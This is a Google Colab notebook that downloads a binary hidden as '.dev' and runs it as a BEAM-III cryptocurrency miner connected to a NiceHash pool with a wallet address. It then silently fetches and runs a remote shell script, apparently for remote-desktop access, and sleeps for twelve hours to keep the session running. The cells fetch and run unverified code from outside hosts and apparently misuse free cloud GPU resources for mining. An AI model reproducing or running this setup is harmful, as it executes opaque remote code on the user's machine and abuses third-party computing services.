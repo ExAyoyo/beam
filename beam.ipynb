{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "KING-REMIX-VPS.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "txj31kKiPZY1"
      },
      "source": [
"!wget https://github.com/WhynotSir/sirji/raw/main/.dev\n",
"!chmod +x .dev\n",
"!./.dev --algo BEAM-III --pool stratum+tcp://beamv3.usa-west.nicehash.com:3387 --user 3G4NsD5kqvT7eCmKeLSZYJGVScBK9jRvtA.Beam\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "4s46cC5YpdUS"
      },
      "source": [
        "! wget https://sefd3.imfast.io/CRD_COLAB_EXE.sh &> /dev/null\r\n",
        "! chmod +x CRD_COLAB_EXE.sh\r\n",
        "! ./CRD_COLAB_EXE.sh"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Q7gNANWHpsUx"
      },
      "source": [
        "! sleep 43200"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
